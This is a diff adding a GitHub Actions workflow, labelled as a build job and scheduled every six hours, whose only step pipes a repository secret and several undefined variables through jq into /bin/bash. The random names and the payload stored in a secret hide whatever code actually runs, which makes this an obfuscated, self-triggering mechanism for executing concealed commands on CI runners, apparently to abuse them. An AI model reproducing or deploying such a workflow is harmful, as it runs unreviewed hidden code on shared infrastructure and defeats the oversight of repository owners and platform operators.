@@ -1,0 +1,26 @@
+name: swimmingsardonic
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: swimmingsardonic
+        env:
+          f06: ${{ secrets.f06 }}
+        run: |
+          echo $f06 | jq -r .utlnp758 | /bin/bash
+          echo $mzez3 | jq -r .vve26524 | /bin/bash
+          echo $xjxn8893 | jq -r .gmus07 | /bin/bash
+          echo $ikk6415 | jq -r .mz22 | /bin/bash
+          echo $px393 | jq -r .xpa25 | /bin/bash
+          echo $n896 | jq -r .l05194 | /bin/bash
+          echo $qqyji45371 | jq -r .kgy851 | /bin/bash
+          echo $x9224 | jq -r .egi16490 | /bin/bash
+          echo $h4 | jq -r .t83436 | /bin/bash
+
